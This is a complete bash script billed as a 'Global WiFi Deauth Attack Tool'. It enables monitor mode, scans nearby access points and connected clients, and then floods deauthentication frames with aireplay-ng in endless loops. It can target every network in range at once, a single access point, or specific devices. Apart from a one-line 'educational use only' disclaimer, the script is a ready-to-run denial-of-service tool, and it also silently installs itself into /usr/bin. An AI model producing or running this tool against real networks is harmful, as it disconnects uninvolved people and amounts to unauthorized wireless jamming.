#!/bin/bash
# Global WiFi Deauth Attack Tool by rff-glitch (Raef)
# Combines all attack modes: single AP, global attack, and specific device targeting

# Root access check
if [[ $EUID -ne 0 ]]; then 
    echo -e "\e[31m[!] Root access is required. Run this script as root.\e[0m"
    exit 1
fi

sudo cp ./blast.sh /usr/bin/blast

# Install dependencies with distro detection
install_dependencies() {
    local pkg_missing=()
    for pkg in aircrack-ng macchanger xterm; do
        if ! command -v $pkg &>/dev/null; then
            pkg_missing+=("$pkg")
        fi
    done

    if [[ ${#pkg_missing[@]} -gt 0 ]]; then
        echo -e "\e[33m[!] Missing packages: ${pkg_missing[*]}. Attempting install...\e[0m"
        if command -v apt &>/dev/null; then
            sudo apt update && sudo apt install -y "${pkg_missing[@]}"
        elif command -v pacman &>/dev/null; then
            sudo pacman -Sy --noconfirm "${pkg_missing[@]}"
        elif command -v dnf &>/dev/null; then
            sudo dnf install -y "${pkg_missing[@]}"
        elif command -v yum &>/dev/null; then
            sudo yum install -y "${pkg_missing[@]}"
        elif command -v zypper &>/dev/null; then
            sudo zypper install -y "${pkg_missing[@]}"
        else
            echo -e "\e[31m[✘] Unsupported package manager. Install these manually: ${pkg_missing[*]}\e[0m"
            exit 1
        fi
    fi
}

# Check for req commands
check_commands() {
    for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig macchanger; do
        if ! command -v "$cmd" &>/dev/null; then 
            echo -e "\e[31m[!] $cmd not found. Please install it.\e[0m"
            exit 1
        fi
    done
}

# init colors
RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m"
PURPLE="\e[35m"; BLUE="\e[34m"; RESET="\e[0m"; BOLD="\e[1m"

# Attack animation
attack_animation() {
    local i=0
    local frames=("💥" "🔥" "⚡" "💣")
    while true; do
        printf "\r${RED}${BOLD}%s ATTACK IN PROGRESS ${PURPLE}%s${RESET}" "${frames[$i]}" "${frames[$i]}"
        i=$(((i+1) % 4))
        sleep 0.3
    done
}

# Display banner
show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo "         .__  _____.__              __                                      "
    echo " __  _  _|__|/ ____\__|            |__|____    _____   _____   ___________  "
    echo " \ \/ \/ /  \   __\|  |  ______    |  \__  \  /     \ /     \_/ __ \_  __ \ "
    echo "  \     /|  ||  |  |  | /_____/    |  |/ __ \|  Y Y  \  Y Y  \  ___/|  | \/ "
    echo "   \/\_/ |__||__|  |__|        /\__|  (____  /__|_|  /__|_|  /\___  >__|    "
    echo "                               \______|    \/      \/      \/     \/        "
    echo -e "${RESET}"
    echo -e "${CYAN}WiFi DEAUTH ATTACK TOOL - Unified Edition${RESET}"
    echo -e "${RED}${BOLD}⚠️  Disclaimer: ${RESET}This tool is for educational use only."
    echo -e "                                   I am not responsible for misuse."
    echo -e "                                            by ${BOLD}${GREEN}RAEF${RESET}"
    echo -e "\n"
}

# Cleanup func
cleanup() {
    echo -e "\n${YELLOW}${BOLD}⚙️  Stopping attacks and restoring interface...${RESET}"
    killall aireplay-ng xterm &>/dev/null
    [[ -n "$attack_pid" ]] && kill $attack_pid 2>/dev/null
    ip link set "$iface" down 2>/dev/null
    iw dev "$iface" set type managed 2>/dev/null
    ip link set "$iface" up 2>/dev/null
    service NetworkManager restart &>/dev/null
    systemctl restart wpa_supplicant &>/dev/null
    rm -f "$csv_file" "$scan_file"-* "$client_csv" "$client_scan_file"-* 2>/dev/null
    echo -e "${GREEN}${BOLD}✅ Network restored. Goodbye.${RESET}"
    exit 0
}

# Scan for networks
scan_networks() {
    scan_file="scan_$(date +%s)"
    echo -e "\n${GREEN}📡 Scanning for access points - window auto-closes in 10s...${RESET}"
    sleep 2
    xterm -T "WiFi Scan" -geometry 100x30 -e "timeout 10s airodump-ng --write $scan_file --output-format csv $iface" &
    scan_pid=$!

    for i in {9..1}; do
        echo -ne "\r${CYAN}⏱️  Time remaining: $i seconds${RESET}"
        sleep 1
    done
    echo -e "\r${GREEN}✅ Scan complete.${RESET}"

    csv_file="${scan_file}-01.csv"
    if [[ ! -f "$csv_file" ]]; then 
        echo -e "${RED}[!] No networks detected.${RESET}"
        exit 1
    fi

    mapfile -t aps < <(awk -F',' '
      NR > 1 && $1 ~ /^[0-9A-F:]{17}$/ && $14 != "" {
        gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $4); gsub(/^ +| +$/, "", $14);
        print $1 "|" $4 "|" $14
      }' "$csv_file" 2>/dev/null)

    if [[ ${#aps[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No viable AP targets found.${RESET}"
        exit 1
    fi

    echo -e "\n${PURPLE}${BOLD}🎯 Detected Networks:${RESET}"
    echo -e "${YELLOW}------------------------------------------------${RESET}"
    printf "${BOLD}%-4s %-20s %-4s %s${RESET}\n" "IDX" "BSSID" "CH" "ESSID"
    for i in "${!aps[@]}"; do
        IFS='|' read -r bssid channel essid <<< "${aps[$i]}"
        printf "%-4s %-20s %-4s %s\n" "[$i]" "$bssid" "$channel" "$essid"
    done
    echo -e "${YELLOW}------------------------------------------------${RESET}"
    echo -e "${RED}${BOLD}Total networks found: ${#aps[@]}${RESET}"
}

# Scan for clients on a specific AP
scan_clients() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    echo -e "\n${GREEN}🎯 Scanning clients on $essid ($bssid)...${RESET}"
    client_scan_file="client_$(date +%s)"
    xterm -T "Client Scan" -geometry 100x30 -e "timeout 12s airodump-ng --bssid $bssid --channel $channel --write $client_scan_file --output-format csv $iface" &
    sleep 14

    client_csv="${client_scan_file}-01.csv"
    mapfile -t clients < <(awk -F',' '
      /^Station MAC/ {found=1; next}
      found && $1 ~ /^[0-9A-F:]{17}$/ {
        gsub(/^ +| +$/, "", $1); print $1
      }' "$client_csv")

    if [[ ${#clients[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No client devices found.${RESET}"
        return 1
    fi

    echo -e "\n${CYAN}📲 Connected Clients:${RESET}"
    for i in "${!clients[@]}"; do 
        vendor=$(macchanger -l | grep -i "${clients[$i]:0:8}" | cut -d ' ' -f 3-)
        [[ -z "$vendor" ]] && vendor="Unknown Vendor"
        echo -e " ${GREEN}[$i]${RESET} MAC: ${BLUE}${clients[$i]}${RESET} 🏷️  ${YELLOW}${vendor}${RESET}"
    done
    return 0
}

# Main attack func
launch_attack() {
    local attack_type="$1"
    local targets=("${@:2}")
    
    echo -e "\n${CYAN}${BOLD}⚠️  WARNING: You are about to launch the attack!${RESET}"
    read -p "Press ENTER to begin the assault or CTRL+C to cancel..."
    
    echo -e "\n${RED}${BOLD}💣 Launching $attack_type attack...${RESET}"
    attack_animation &
    attack_pid=$!
    
    case "$attack_type" in
        "global")
            for ap in "${targets[@]}"; do
                IFS='|' read -r bssid channel essid <<< "$ap"
                iw dev "$iface" set channel "$channel"
                for i in {1..3}; do
                    xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $essid" \
                        -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
                    sleep 0.2
                done
            done
            ;;
        "single")
            IFS='|' read -r bssid channel essid <<< "${targets[0]}"
            iw dev "$iface" set channel "$channel"
            for i in {1..3}; do
                xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $essid" \
                    -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
                sleep 0.2
            done
            ;;
        "client")
            IFS='|' read -r bssid channel essid <<< "${targets[0]}"
            iw dev "$iface" set channel "$channel"
            for client_mac in "${targets[@]:1}"; do
                echo -e "${YELLOW}🔥 Attacking $client_mac on $essid...${RESET}"
                xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $client_mac" \
                    -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid -c $client_mac $iface; sleep 1; done" &
                sleep 0.2
            done
            ;;
    esac
    
    read -p $'\nPress ENTER to stop all attacks and restore your network...'
    kill $attack_pid
    cleanup
}

# Main excu
install_dependencies
check_commands
show_banner
trap cleanup INT

# Get ifaces
mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo -e "${RED}[!] No wireless interfaces found.${RESET}"
    exit 1
fi

# Show interfaces
echo -e "\n${YELLOW}${BOLD}Available Interfaces:${RESET}"
for i in "${!interfaces[@]}"; do 
    echo -e " ${GREEN}[$i]${RESET} ${BLUE}${interfaces[$i]}${RESET}"
done
read -p "Select interface: " iface_idx
iface="${interfaces[$iface_idx]}"

# Enable monitor md
echo -e "\n${CYAN}🔧 Enabling monitor mode on ${YELLOW}$iface${CYAN}...${RESET}"
airmon-ng check kill &>/dev/null
ip link set "$iface" down
iw dev "$iface" set type monitor
ip link set "$iface" up
iw dev "$iface" set power_save off

# Scan networks
scan_networks

# Select attack mode
echo -e "\n${CYAN}${BOLD}Select Attack Mode:${RESET}"
echo -e "[0] ${RED}Global Attack${RESET} - Target ALL networks"
echo -e "[1] ${YELLOW}Single Network Attack${RESET} - Target one specific AP"
echo -e "[2] ${PURPLE}Client-Specific Attack${RESET} - Target specific devices on a network"
read -p "Choose attack mode [0/1/2]: " attack_mode

case "$attack_mode" in
    0)
        # Global attack
        launch_attack "global" "${aps[@]}"
        ;;
    1)
        # Single network attack
        read -p "Select target network index: " sel
        selected=("${aps[$sel]}")
        launch_attack "single" "${selected[@]}"
        ;;
    2)
        # Client-specific attack
        read -p "Select target network index for client scan: " sel
        IFS='|' read -r bssid channel essid <<< "${aps[$sel]}"
        scan_clients "$bssid" "$channel" "$essid" || exit 1
        
        read -p "Select client index(es) to attack (e.g., 0,2,4): " client_input
        IFS=',' read -ra client_indices <<< "$client_input"
        
        client_targets=("${aps[$sel]}")
        for idx in "${client_indices[@]}"; do
            client_targets+=("${clients[$idx]}")
        done
        
        launch_attack "client" "${client_targets[@]}"
        ;;
    *)
        echo -e "${RED}[!] Invalid selection${RESET}"
        cleanup
        ;;
esac
